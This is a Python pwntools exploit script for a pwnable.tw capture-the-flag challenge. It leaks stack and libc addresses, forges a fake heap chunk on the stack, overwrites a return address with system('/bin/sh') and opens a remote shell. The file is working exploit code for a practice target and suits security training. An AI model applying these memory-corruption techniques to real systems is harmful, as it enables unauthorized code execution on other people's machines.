from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '75']

PROG = './chal'
exe = ELF(PROG)
libc = ELF('./libc_32.so.6')

### ------------------ EXPLOIT ------------------ ###

#r = process(PROG)
r = remote('chall.pwnable.tw', 10204)

def pay(name, age, reason, comment):
    r.sendlineafter(b'name: ', name)
    r.sendlineafter(b'age: ', age)
    r.sendlineafter(b'movie? ', reason)
    r.sendlineafter(b'comment: ', comment)
    r.sendlineafter(b'<y/n>: ', b'y')

def npay(name, reason, comment):
    r.sendlineafter(b'name: ', name)
    r.sendafter(b'movie? ', reason)
    r.sendafter(b'comment: ', comment)

def nxt():
    r.sendlineafter(b'<y/n>: ', b'y')


for i in range(100):
    pay(b'aaaa', b'12', b'bbbb', b'cccc')

comment = b'c' * 0x54
comment += p32(0) # free(0)
#gdb.attach(r, 'b *0x0804875e\nc')
npay(b'aaaa', b'b' * (14*4), comment)

r.recvuntil(b'Reason: ')
r.recv(14*4)

ebp_leak = unpack(r.recv(4), 32, endian='little')
log.info('Leaked ebp: ' + hex(ebp_leak))

r.recv(4)

libc_leak = unpack(r.recv(4), 32, endian='little')
libc.address = libc_leak - 0x5d33b
log.info('Leaked libc base: ' + hex(libc.address))

nxt()

# create fake chunk onto stack
chunk_ptr = ebp_leak - 0x68
log.info('Chunk ptr: ' + hex(chunk_ptr))

comment = b'\xff' * (21*4)
comment += p32(chunk_ptr)

rsn = p32(0) + p32(0x41)
rsn += b'C' * (15*4)
rsn += p32(0x40)

#gdb.attach(r, 'b *0x0804875e\nc')
npay(b'', rsn, comment)

r.sendlineafter(b'<y/n>: ', b'y')

# overwrite ret
binsh = libc.address + 0x158e8b

name = b'A' * (19*4)
name += p32(libc.symbols['system'])
name += b'b' * 4
name += p32(binsh)

r.sendlineafter(b'name: ', name)
r.sendlineafter(b'movie? ', b'')
r.sendlineafter(b': ', b'')

r.sendlineafter(b'<y/n>: ', b'n')

r.interactive()
